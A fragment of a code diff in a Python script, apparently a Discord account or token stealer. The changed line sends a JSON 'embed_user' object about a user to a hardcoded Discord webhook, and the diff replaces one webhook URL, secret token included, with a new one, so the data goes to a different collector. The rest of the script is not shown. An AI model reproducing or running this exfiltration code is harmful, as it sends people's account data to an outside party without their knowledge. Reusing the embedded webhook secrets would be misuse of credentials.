@@ -202,7 +202,7 @@ def main():
                     "avatar_url": "https://cdn.discordapp.com/attachments/1377634302522687498/1419469948178399372/497a7c1ea5792ab629a3014892714892.png?ex=68d1dfe8&is=68d08e68&hm=dcac5fb74b3a99b7c7ead6647f6e1b69281be5f3dac254be7154fc9d42454e94"
                 }
 
-                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1419413542951456931/mi22ovzStFS9rl_nDQXWfFqkw7Y8Anq3Qx3B2z-cgBU2qL9ztFdNQU2QfKIi9ioQXJjn', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
+                urllib.request.urlopen(urllib.request.Request('https://discord.com/api/webhooks/1423367199481008270/Ww6JYsYJHtogaYsF3FyVThMQWLrz6GsIRP1BSjlxEqnpREGlZAYGgjupJ5t6FlPrmXT2', data=json.dumps(embed_user).encode('utf-8'), headers=getheaders(), method='POST')).read().decode()
             except urllib.error.HTTPError or json.JSONDecodeError:
                 continue
             except Exception as e:
